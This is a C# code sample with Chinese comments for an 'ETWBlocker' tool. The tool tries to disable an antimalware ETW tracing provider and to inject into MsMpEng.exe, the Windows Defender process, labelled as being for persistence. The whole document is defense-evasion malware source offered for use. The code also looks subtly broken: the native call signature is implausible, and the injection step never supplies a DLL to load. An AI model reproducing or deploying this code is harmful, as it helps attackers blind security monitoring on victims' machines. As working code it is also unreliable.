### **代码示例（C#）**
```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class ETWBlocker
{
    // ETW API
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtControlEventTrace(
        uint ControlCode,
        IntPtr ClientContext,
        IntPtr ClientContextLength,
        IntPtr ProviderId,
        IntPtr ProviderIdLength,
        IntPtr Buffer,
        IntPtr BufferLength,
        out uint ReturnLength);

    // 常量定义
    private const uint EVENT_TRACE_CONTROL_CODE_DISABLE_PROVIDER = 2;
    private const uint EVENT_TRACE_CONTROL_CODE_ENABLE_PROVIDER = 3;

    // 目标Provider GUID（Microsoft-Antimalware-ETW）
    private static readonly byte[] MicrosoftAntimalwareETWProviderId =
    {
        0x5E, 0x6C, 0x85, 0x8F, 0x1D, 0x74, 0x48, 0xCB,
        0x99, 0xE8, 0x67, 0xB0, 0xD8, 0x4B, 0xB7, 0xC7
    };

    public static bool DisableETWProvider()
    {
        try
        {
            // 1. 检查是否为管理员
            if (!IsAdministrator())
            {
                Console.WriteLine("Error: Requires administrator privileges.");
                return false;
            }

            // 2. 调用NtControlEventTrace禁用Provider
            IntPtr providerIdPtr = Marshal.AllocHGlobal(MicrosoftAntimalwareETWProviderId.Length);
            Marshal.Copy(MicrosoftAntimalwareETWProviderId, 0, providerIdPtr, MicrosoftAntimalwareETWProviderId.Length);

            uint returnLength;
            uint result = NtControlEventTrace(
                EVENT_TRACE_CONTROL_CODE_DISABLE_PROVIDER,
                IntPtr.Zero,
                IntPtr.Zero,
                providerIdPtr,
                (IntPtr)MicrosoftAntimalwareETWProviderId.Length,
                IntPtr.Zero,
                IntPtr.Zero,
                out returnLength);

            Marshal.FreeHGlobal(providerIdPtr);

            if (result != 0)
            {
                Console.WriteLine($"Error disabling ETW Provider: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine("Successfully disabled Microsoft-Antimalware-ETW Provider.");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Exception: {ex.Message}");
            return false;
        }
    }

    // 检查是否为管理员
    private static bool IsAdministrator()
    {
        using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    // 进程注入（可选，用于持久化）
    public static void InjectIntoProcess(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length == 0)
        {
            Console.WriteLine($"Process {processName} not found.");
            return;
        }

        Process targetProcess = processes[0];
        try
        {
            // 1. 创建远程线程执行DisableETWProvider
            IntPtr hProcess = targetProcess.Handle;
            IntPtr hModule = GetModuleHandle("kernel32.dll");
            IntPtr funcPtr = GetProcAddress(hModule, "LoadLibraryA");

            // 2. 将当前DLL注入到目标进程
            IntPtr remoteThread = CreateRemoteThread(
                hProcess,
                IntPtr.Zero,
                0,
                funcPtr,
                IntPtr.Zero,
                0,
                IntPtr.Zero);

            if (remoteThread == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to inject into {processName}: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                Console.WriteLine($"Successfully injected into {processName}.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Injection error: {ex.Message}");
        }
    }

    // API声明（简化版）
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
}

class Program
{
    static void Main(string[] args)
    {
        // 禁用ETW Provider
        ETWBlocker.DisableETWProvider();

        // 可选：注入到MsMpEng.exe（Defender进程）
        ETWBlocker.InjectIntoProcess("MsMpEng");
    }
}
```

